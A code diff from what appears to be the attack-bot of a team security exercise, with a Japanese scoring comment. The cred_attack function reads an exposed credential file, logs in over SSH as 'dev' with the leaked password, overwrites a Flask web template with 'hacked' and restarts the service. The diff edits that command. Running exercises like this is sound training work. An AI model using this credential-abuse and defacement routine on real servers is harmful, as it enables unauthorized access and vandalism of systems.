@@ -117,8 +117,8 @@ def cred_attack(team_id):
 		if res.status_code == 200:
 			if "dev" in res.text and "devpass123" in res.text:
 				print("\033[31mteam", team_id, target + ":" + str(port) ,"has credential file: ", u,"\033[0m")
-				exploit = "echo devpass123 | sudo -S chown dev:dev /var/www/html/webapp/templates/index.html && echo hacked | sudo tee /var/www/html/webapp/templates/index.html > /dev/null"
-				m1_brute.sshc(team_id, target, port, "dev", "devpass123", exploit)
+				exploit = "sudo chown dev:dev /var/www/html/webapp/templates/index.html && echo hacked > /var/www/html/webapp/templates/index.html && sudo systemctl restart http-flask.service"
+				m1_brute.sshc(team_id, target, 22, "dev", "devpass123", exploit)
 			else:
 				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
 				print("team", team_id, target + ":" + str(port), "could not get hacked")
